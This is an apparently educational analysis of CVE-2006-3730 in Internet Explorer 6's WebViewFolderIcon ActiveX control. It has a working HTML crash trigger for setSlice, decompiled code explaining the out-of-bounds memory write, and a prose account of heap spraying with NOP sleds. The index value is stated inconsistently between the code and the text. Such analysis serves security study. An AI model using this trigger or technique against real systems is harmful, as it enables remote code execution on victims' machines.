# CVE-2006-3730

This is a vulnerability present in Internet Explorer 6 (Windows XP SP2). The main culprits are the webvw.dll and comctl32.dll windows libraries. WebVW exposes several ActiveX objects that can be embedded into webpages. The object we are interested in, is known as 
**WebViewFolderIcon.WebViewFolderIcon.1**. The problem lies within the **setSlice()** method were it can be called with parameters of any size that are not validated. This causes a chain reaction of an invalid memory copy inside of comctl32.dll.

This is a simple bug that is caused by a lack of validation inside of **setSlice** which eventually leads to a crash inside of comctl32.dll.


## Causing the crash

Getting the crash to occur is as follows:

```html
<HTML>
<BODY>
<SCRIPT language="javascript">
      var tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
      tar.setSlice(0x7fffffff, 0x05050505, 0x05050505,0x05050505 ); 
</SCRIPT> 
</BODY>
</HTML>
```

We create a ActiveX object with the identifier of **WebViewFolderIcon** and call the **setSlice** method from before with a large interger as the first parameter. Running this code alone in a IE6 browser on Windows XP SP2 will crash the browser.

## Why it occurs

To help understand why it occurs, it helps to see the **setSlice** and subsequent functions in static analysis.

### setSlice()
```c++
void __stdcall CWebViewFolderIcon::setSlice(CWebViewFolderIcon *this, int i, struct tagVARIANT pitem, struct tagVARIANT a4, struct tagVARIANT a5)
{
  ....

  if ( DSA_SetItem(*((HDSA *)this + 0x3F), i, &pitem) )
  {
    .....
  }
}
```

There is more to this function, however for simplicity most of it has been omitted. The most important part here is that the **i** variable holds the value of setSlice's first parameter. There is no validation at all and it is passed directly into DSA_SetItem.

### DSA_SetItem()

DSA_SetItem is a function provided by comctl32.dll which allows the user to modify items inside of a DSA (Dynamic Structure Array) object by an index. A DSA is simply an array that can grow or shrink in size by allocating more/less memory if necessary.
**WebViewFolderIcon** uses a DSA to store some sort of data and the setItem call is to modify an item within that array by the index **i** with the contents of **pitem**.

```c++
BOOL __stdcall DSA_SetItem(_DSA *hdsa, int i, const void *pitem)
{
  int index; // eax
  BOOL reallocResult; // eax
  int newCapacity; // esi

  // DSA_SetItem is not exported by name. 
  // To use it, you must use GetProcAddress and request ordinal 325 from ComCtl32.dll to obtain a function pointer.

  index = i;

  if ( i < 0 )
    // Index cannot be negative
    return 0;

  // If the index is greater than or equal to the current number of items in the DSA
  if ( i >= hdsa->nItemCount )
  {
    
    // If the index + 1 exceeds the capacity of the DSA
    if ( i + 1 > hdsa->nMaxCount )
    {
      newCapacity = hdsa->nGrow * ((hdsa->nGrow + i) / hdsa->nGrow);

      reallocResult = ReAlloc(hdsa->pData, newCapacity * hdsa->nItemSize);

      // Memory reallocation failed
      if ( !reallocResult )
        return reallocResult;

      hdsa->pData = (LPVOID)reallocResult;

      index = i;

      // Update the capacity
      hdsa->nMaxCount = newCapacity;
    }

    // Update the number of items
    hdsa->nItemCount = i + 1;
  }

  // Copy the item data to the specified index in the array
  qmemcpy((char *)hdsa->pData + index * hdsa->nItemSize, pitem, hdsa->nItemSize);

  return 1;
}
```

Currently as the function stands, there is **0x7ffffffe** stored inside of **i**. The first check ensures that the number is not negative (**true**), it then checks if the current index is bigger than the current item count to understand if it needs to allocate more space.
DSA's have a max item count specified when it is created, as discussed before it can increase its capacity to accomodate for more items if need be. 

Note that on the line ```if ( i + 1 > hdsa->nMaxCount )```, 1 is added onto the index. The actual exploit uses 0x7ffffffe, which allows an increment of 1 before it is too big for a 32-bit integer. This is done to ensure we don't trigger any integer overflow bounds checking before reaching qmemcpy.

The last call to **qmemcpy** is what completes the invalid copy. Here the destination ptr is set to ```hdsa->pData + index * hdsa->nItemSize```, were pData is added together with our index of **0x7ffffffe** multiplied by the current itemSize.
As expected this will turn out to be a massive address located in a random location. This causes the invalid copy. We can now write memory to a arbitrary location inside of the app.

## Exploiting the bug

Lastly to exploit this bug a technique called heap spraying is utilized, while I am still learning about this method, I can roughly explain how it works.

**Exploit provided by JAMIKAZU at https://www.exploit-db.com/exploits/2448 all credits to them.**

Heap spraying is essentially **spraying** loads of instances of shellcode onto the heap and then abusing the invalid copy bug to write numerous instances of an address (0x05050505) onto random parts of the heap, hoping that it overwrites an existing control structure, function ptr or return ptr to
redirect the EIP (Instruction Pointer) to the shellcode. This works because the next parameters of **setSlice(0x7fffffff, THIS, THIS, THIS)** will be written to wherever qmemcpy decides to put it. To aid in ensuring the shellcode is executed, a NOP slead is used.

### NOP Slead

A NOP slead is when a bunch of NOP instructions are tacked onto the start of the shellcode, this is because when the heap is sprayed there is no guarantee that the shellcode's first instruction will land directly at 0x05050505. Therefore a slead of NOPs is added before to slide the instruction pointer to the start
of the shellcode to ensure it executes correctly.

```
Memory Address:
0x05050500  [ NOP ][ NOP ][ NOP ][ NOP ][ NOP ]
0x05050505 (EIP)  [ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ]
0x05050510  [ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ]
0x05050520  [ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ]
...
0x050507F0  [ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ][ NOP ]
0x05050800  [ SHELLCODE: Start ]
0x05050820  [ SHELLCODE: More ]
...
```

As seen in the visualisation above, after the heap spray the shellcode has ended up at 0x05050800. However the EIP is at 0x05050505. All of the NOP instructions before hand allow the EIP to continually executing normally (without crashing) until it reaches the start of the shellcode.
Which it then will execute.




























